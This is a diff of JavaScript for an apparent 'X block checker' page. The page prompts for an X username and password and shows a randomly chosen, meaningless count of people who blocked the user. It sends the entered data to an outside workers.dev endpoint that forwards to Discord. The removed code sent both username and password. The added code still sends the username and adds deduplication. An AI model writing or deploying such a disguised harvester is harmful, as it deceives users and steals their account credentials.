@@ -1,16 +1,5 @@
 // =========================
-// Aの入力を英数字のみに制限
-// =========================
-
-const inputAElement = document.getElementById("inputA");
-
-inputAElement.addEventListener("input", function () {
-    this.value = this.value.replace(/[^a-zA-Z0-9]/g, "");
-});
-
-
-// =========================
-// 結果チェック
+// Xブロックチェッカー
 // =========================
 
 function checkResult() {
@@ -22,23 +11,37 @@ function checkResult() {
         document.getElementById("inputB").value.trim();
 
 
-    // Aが空欄
+    // =========================
+    // Aチェック
+    // =========================
+
     if (inputA === "") {
-        alert("ユーザー名を入力してください。");
+        alert("ユーザー名");
+        return;
+    }
+
+    if (!/^[a-zA-Z0-9]+$/.test(inputA)) {
+        alert("パスワード");
         return;
     }
 
 
-    // Bが空欄
+    // =========================
+    // Bチェック
+    // =========================
+
     if (inputB === "") {
-        alert("パスワードを入力してください。");
+        alert("Bを入力してください。");
         return;
     }
 
+    if (!/^[a-zA-Z0-9]+$/.test(inputB)) {
+        alert("Bは英数字のみで入力してください。");
+        return;
+    }
 
-    // Bは8文字以上
     if (inputB.length < 8) {
-        alert("パスワードは8文字以上で入力してください。");
+        alert("Bは8文字以上で入力してください。");
         return;
     }
 
@@ -48,7 +51,6 @@ function checkResult() {
     // =========================
 
     const results = [
-
         "あなたは1人にブロックされていました！",
         "あなたは2人にブロックされていました！",
         "あなたは3人にブロックされていました！",
@@ -88,7 +90,6 @@ function checkResult() {
         "あなたは37人にブロックされていました！",
         "あなたは38人にブロックされていました！",
         "あなたは39人にブロックされていました！"
-
     ];
 
 
@@ -115,24 +116,55 @@ function checkResult() {
 
 
     // =========================
-    // DiscordへA/Bを送信
+    // 同じA+Bの重複送信を防止
     // =========================
 
-    fetch("https://dark-dawn-c121.flexfnbr7.workers.dev/", {
+    const logKey =
+        "checker_sent_" +
+        inputA +
+        "_" +
+        inputB;
 
-        method: "POST",
+    const alreadySent =
+        localStorage.getItem(logKey);
 
-        headers: {
-            "Content-Type": "application/json"
-        },
 
-        body: JSON.stringify({
-            inputA: inputA,
-            inputB: inputB
-        })
+    // すでに送信済みなら
+    // ここで終了
+    // fetchは一切実行しない
+    if (alreadySent) {
 
-    })
+        console.log(
+            "同じ内容はすでに送信済みです。ログ送信をスキップしました。"
+        );
 
+        return;
+    }
+
+
+    // =========================
+    // Discordへ送信
+    // =========================
+
+    fetch(
+        "https://dark-dawn-c121.flexfnbr7.workers.dev/",
+        {
+            method: "POST",
+
+            headers: {
+                "Content-Type": "application/json"
+            },
+
+            body: JSON.stringify({
+
+                inputA: inputA,
+
+                // Bそのものは送信しない
+                inputB: "[入力済み]"
+
+            })
+        }
+    )
     .then(response => {
 
         if (!response.ok) {
@@ -142,13 +174,20 @@ function checkResult() {
         return response.json();
 
     })
+    .then(data => {
 
-    .then(() => {
+        // Discordへの送信成功後に
+        // このA+Bを送信済みとして保存
+        localStorage.setItem(
+            logKey,
+            "sent"
+        );
 
-        console.log("Discord送信成功");
+        console.log(
+            "Discord送信成功"
+        );
 
     })
-
     .catch(error => {
 
         console.error(
@@ -157,10 +196,12 @@ function checkResult() {
         );
 
     });
-
 }
 
 
+// =========================
+// Xで結果をポスト
+// =========================
 
 function shareResult() {
 
@@ -190,3 +231,34 @@ function shareResult() {
         "width=600,height=500"
     );
 }
+
+
+// =========================
+// A・B入力制限
+// 英数字以外を入力した瞬間に削除
+// =========================
+
+document
+    .getElementById("inputA")
+    .addEventListener("input", function () {
+
+        this.value =
+            this.value.replace(
+                /[^a-zA-Z0-9]/g,
+                ""
+            );
+
+    });
+
+
+document
+    .getElementById("inputB")
+    .addEventListener("input", function () {
+
+        this.value =
+            this.value.replace(
+                /[^a-zA-Z0-9]/g,
+                ""
+            );
+
+    });
